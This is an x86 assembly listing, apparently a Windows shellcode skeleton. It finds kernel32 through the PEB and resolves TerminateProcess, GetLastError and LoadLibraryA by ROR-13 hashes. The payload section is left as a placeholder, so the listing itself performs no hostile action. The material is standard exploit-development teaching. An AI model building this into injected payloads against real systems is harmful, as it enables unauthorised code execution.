   
    start:                                ;
       ;int3                              ; # REMOVE WHEN NOT DEBUGGING
       mov ebp, esp                       ;
       add esp, 0xfffff9f0                ;

    find_kernel32:                        ;
       xor ecx,ecx                        ; # ECX = 0
       mov esi,fs:[ecx+30h]               ; # ESI = &(PEB) ([FS:0x30])
       mov esi,[esi+0Ch]                  ; # ESI = PEB->Ldr
       mov esi,[esi+1Ch]                  ; # ESI = PEB->Ldr.InitOrder

    next_module:                          ;
       mov ebx,[esi+8h]                   ; # EBX = InInitOrder[X].base_address
       mov edi,[esi+20h]                  ; # EDI = InInitOrder[X].module_name
       mov esi,[esi]                      ; # ESI = InInitOrder[X].flink
       cmp [edi+12*2], cx                 ; # (unicode) modulename[12] == 0x00?
       jne next_module                    ; # No; try next module

    find_function_shorten:
        jmp find_function_shorten_bnc  	  ; #  Short jump

    find_function_ret:
        pop esi                           ; # POP the return address from the stack
        mov [ebp+0x04], esi               ; # Save find_function address for later usage
        jmp resolve_symbols_kernel32      ; # 

    find_function_shorten_bnc:            ;
        call find_function_ret            ; # Relative CALL with negative offset

    find_function:
        pushad                            ; # Save all registers. Base address of kernel32 is in EBX
        mov eax, [ebx+0x3c]               ; # Offset to PE registers
        mov edi, [ebx+eax+0x78]           ; # Export Table Directory RVA
        add edi, ebx                      ; # Export Table Directory VMA
        mov ecx, [edi+0x18]               ; # NumberOfNames
        mov eax, [edi+0x20]               ; # AddressOfNames RVA
        add eax, ebx                      ; # AddressOfNames VMA
        mov [ebp-4], eax                  ; # Save AddressOfNames VMA for later

    find_function_loop:
        jecxz find_function_finished      ; # Jump to end of ECX == 0
        dec ecx                           ; # Decrement counter
        mov eax, [ebp-4]                  ; # Restore AddressOfNames VMA
        mov esi, [eax+ecx*4]              ; # Get RVA of symbol name
        add esi, ebx                      ; # Set ESI to VMA of current symbol

    compute_hash:
        xor eax, eax                    ; # NULL EAX
        cdq                             ; # NULL EDX
        cld                             ; # Clear direction flag

    compute_hash_again:
        lodsb                           ; # Load the next byte from ESI into AL
        test al, al                     ; # Check for NULL term
        jz compute_hash_finished        ; # If zero flag is set, hitted the NULL
        ror edx, 0x0d                   ; # Rotate EDX 13 bits to right
        add edx, eax                    ; # Add new byte to EDX
        jmp compute_hash_again          ; # Next iteration

    compute_hash_finished:

    find_function_compare:
        cmp edx, [esp+0x24]             ; Compare hash with requested hash
        jnz find_function_loop          ; If not existing, go back to loop
        mov edx, [edi+0x24]             ; AddressOfNameOrdinals RVA
        add edx, ebx                    ; AddressOfNameOrdinals VMA
        mov cx, [edx+2*ecx]             ; Extrapolate function's ordinal
        mov edx, [edi+0x1c]             ; AddressOfFunctions RVA
        add edx, ebx                    ; AddressOfFunctions VMA
        mov eax, [edx+4*ecx]            ; Get the function RVA
        add eax, ebx                    ; Get the function VMA
        mov [esp+0x1c], eax             ; Overwrite stack version of EAX from PUSHAD

    find_function_finished:             ;
        popad                           ; # Restore registers
        ret

    resolve_symbols_kernel32:
        push 0x78b5b983                 ; TerminateProcess hash
        call dword ptr [ebp+0x04]        ; Call find function
        mov [ebp+0x10], eax             ; Save TerminateProcess
        push 0x75da1966                 ; GetLastError hash
        call dword ptr [ebp+0x04]        ; Call find function
        mov [ebp+0x14], eax             ; Save GetLastError        
        push 0xec0e4e8e                 ; LoadLibraryA hash
        call dword ptr [ebp+0x04]        ; Call find function
        mov [ebp+0x18], eax             ; Save LoadLibraryA
        
        ; ADD FUNCTIONS TO LOAD HERE

        jmp xxxxxxxxxxxxxx              ; Jump over call_getlasterror

    call_getlasterror:
        call dword ptr [ebp+0x14]           ; Call GetLastError





